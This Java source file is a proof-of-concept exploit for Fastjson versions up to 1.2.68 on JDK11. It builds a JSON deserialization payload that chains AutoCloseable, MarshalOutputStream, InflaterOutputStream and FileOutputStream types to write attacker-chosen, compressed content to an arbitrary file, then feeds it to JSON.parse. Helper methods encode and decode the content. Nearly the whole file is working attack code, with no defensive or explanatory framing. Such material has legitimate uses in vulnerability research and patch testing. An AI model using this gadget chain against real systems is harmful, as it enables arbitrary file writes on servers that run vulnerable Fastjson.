package test;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Base64;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

import com.alibaba.fastjson.JSON;

public class Fastjson4_JDK11 {
    public static void main(String[] args) throws Exception {
    	String code = gzcompress("RMB122 is here");
    	//php -r "echo base64_encode(gzcompress('RMB122 is here'));"
    	//<=1.2.68 and JDK11
        String payload = "{\r\n"
        		+ "    \"@type\":\"java.lang.AutoCloseable\",\r\n"
        		+ "    \"@type\":\"sun.rmi.server.MarshalOutputStream\",\r\n"
        		+ "    \"out\":\r\n"
        		+ "    {\r\n"
        		+ "        \"@type\":\"java.util.zip.InflaterOutputStream\",\r\n"
        		+ "        \"out\":\r\n"
        		+ "        {\r\n"
        		+ "           \"@type\":\"java.io.FileOutputStream\",\r\n"
        		+ "           \"file\":\"1.txt\",\r\n"
        		+ "           \"append\":false\r\n"
        		+ "        },\r\n"
        		+ "        \"infl\":\r\n"
        		+ "        {\r\n"
        		+ "            \"input\":\r\n"
        		+ "            {\r\n"
        		+ "                \"array\":\""+code+"\",\r\n"
        		+ "                \"limit\":22\r\n"
        		+ "            }\r\n"
        		+ "        },\r\n"
        		+ "        \"bufLen\":1048576\r\n"
        		+ "    },\r\n"
        		+ "    \"protocolVersion\":1\r\n"
        		+ "}\r\n"
        		+ "";
        System.out.println(payload);
        JSON.parse(payload);	
    }
    public static String gzcompress(String code) {
    	byte[] data = code.getBytes();
        byte[] output = new byte[0];
        Deflater compresser = new Deflater();
        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        return Base64.getEncoder().encodeToString(output);
    }
    public static String gzuncompress(String code) {
    	byte[] data = Base64.getDecoder().decode(code);
    	byte[] output = new byte[0];
        Inflater decompresser = new Inflater();
        decompresser.reset();
        decompresser.setInput(data);
        ByteArrayOutputStream o = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!decompresser.finished()) {
                int i = decompresser.inflate(buf);
                o.write(buf, 0, i);
            }
            output = o.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                o.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        decompresser.end();
        return new String(output);
    }
}
